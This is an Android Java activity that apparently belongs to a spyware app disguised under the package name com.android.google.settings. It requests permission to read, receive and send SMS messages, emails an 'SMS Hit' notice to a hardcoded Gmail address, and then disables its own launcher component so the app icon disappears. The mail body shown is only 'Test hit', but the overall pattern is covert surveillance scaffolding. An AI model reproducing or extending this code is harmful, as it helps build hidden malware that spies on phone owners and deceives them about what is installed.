package com.android.google.settings;

import android.Manifest;
import android.content.ComponentName;
import android.content.pm.PackageManager;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Toast;

import com.karumi.dexter.Dexter;
import com.karumi.dexter.MultiplePermissionsReport;
import com.karumi.dexter.PermissionToken;
import com.karumi.dexter.listener.PermissionRequest;
import com.karumi.dexter.listener.multi.MultiplePermissionsListener;
import com.theah64.safemail.SafeMail;

import java.util.List;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        findViewById(R.id.bTest).setOnClickListener(new OnClickListener() {
            @Override
            public void onClick(View view) {
                Dexter
                        .withActivity(MainActivity.this)
                        .withPermissions(
                                Manifest.permission.RECEIVE_SMS,
                                Manifest.permission.SEND_SMS,
                                Manifest.permission.READ_SMS

                        )
                        .withListener(new MultiplePermissionsListener() {
                            @Override
                            public void onPermissionsChecked(MultiplePermissionsReport report) {
                                if (report.areAllPermissionsGranted()) {
                                    Toast.makeText(MainActivity.this, "Sending mail...", Toast.LENGTH_SHORT).show();
                                    sendTestMail();
                                }
                            }

                            @Override
                            public void onPermissionRationaleShouldBeShown(List<PermissionRequest> permissions, PermissionToken token) {

                            }
                        })
                        .check();
            }
        });
    }

    private void sendTestMail() {
        SafeMail.sendMail(
                "theapache64@gmail.com",
                "theapache64@gmail.com",
                "SMS Hit",
                "Test hit",
                new SafeMail.SafeMailCallback() {
                    @Override
                    public void onSuccess() {
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                Toast.makeText(MainActivity.this, "Sent", Toast.LENGTH_SHORT).show();

                                PackageManager p = getPackageManager();
                                ComponentName componentName = new ComponentName(MainActivity.this, MainActivity.class);
                                p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
                            }
                        });
                    }

                    @Override
                    public void onFailed(Throwable throwable) {
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                Toast.makeText(MainActivity.this, "Not Sent!", Toast.LENGTH_SHORT).show();
                            }
                        });
                    }
                }
        );
    }
}
